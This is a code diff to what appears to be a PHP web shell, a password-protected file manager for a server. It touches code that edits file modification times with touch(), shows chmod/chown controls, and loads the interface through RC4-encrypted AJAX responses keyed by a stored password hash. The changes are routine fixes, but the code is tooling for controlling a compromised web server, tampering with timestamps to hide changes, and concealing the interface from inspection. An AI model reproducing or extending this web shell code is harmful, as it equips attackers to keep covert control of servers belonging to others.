@@ -961,7 +961,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			title = "' . tText('chmodchown', 'Chmod/Chown') . '";
 			text = title.substring(0, 5);
 		} else if (a === "mdate"){
-			path = o.innerHTML;
+			path = o.getAttribute("data-ft");
 			title = "' . tText('date', 'Date') . '";
 			text = title;
 		} else if ((a === "cdir") || (a === "cfile")){
@@ -1827,7 +1827,6 @@ if (isset($p['me']) && $p['me'] === 'file'){
 				if (!@file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
 				else {
-					//date_format(date_create_from_format('Y-m-d', $dateString), 'd-m-Y'));
 					if (isset($p['b'])) $time = strtotime($p['b']);
 					else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
 					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
@@ -2125,7 +2124,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			<td class="touch" width="70%"><b>' . tText('name', 'Name') . '</b></td>
 			<td class="touch"><b>' . tText('date', 'Date') . '</b></td>
 			<td class="touch"><b>' . tText('size', 'Size') . '</b></td>
-			' . (! $isWIN ? '<td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
+			' . (! $isWIN ? '<td class="touch"><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
 			<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
 			</tr></thead>
 			<tbody>';
@@ -2136,10 +2135,11 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			
 			$bg = 2;
 			foreach ($dirdata as $file){
+				$ft = filemtime($currentdir . $file);
                 $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
 					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
-					<td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
+					<td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
 					<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
 					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this)";return false;>' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
 					'</td>' : '') . '
@@ -2153,6 +2153,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
             }
 
             foreach ($filedata as $file){
+				$ft = filemtime($currentdir . $file);
                 $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
 
@@ -2160,7 +2161,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
                 elseif($isLinked) $sBuff .= showIcon($file) . ' <a href="' . $baseURL . $file . '" target="_blank">' . $file . '</a>';
                 else $sBuff .= showIcon($file) . ' ' . $file . '</a>';
                
-			   $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
+			   $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
 							<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
 							' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
 							'</td>' : '') . '
@@ -3121,9 +3122,9 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 
 	function md5blk(s) { 
 		md5blks = [];
-		for (i = 0; i < 64; i += 4) {
+		for (i = 0; i < 64; i += 4)
 			md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) + (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
-		}
+		
 		return md5blks;
 	}
 
@@ -3150,9 +3151,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	ajax = new XMLHttpRequest();
 	ajax.onreadystatechange = function() {
 		if (ajax.readyState == 4 && ajax.status == 200) {
-			hash = sessionStorage.getItem('{$config['consNames']['slogin']}');
 			d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash)).substr({$config['rc4drop']});
-			
 			oldscript = d.getElementsByTagName('head')[0].getElementsByTagName('script')[0];			
 			fixscript = d.createElement('script');
 			fixscript.type = 'text/javascript';
@@ -3163,9 +3162,9 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	}
 	
 	if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) 
-		hash = sessionStorage.getItem('{$config['consNames']['slogin']}');
+		var hash = sessionStorage.getItem('{$config['consNames']['slogin']}');
 	else {
-		hash = md5(d.getElementById('pss').value);
+		var hash = md5(d.getElementById('pss').value);
 		sessionStorage.setItem('{$config['consNames']['slogin']}', hash);
 	}
 	
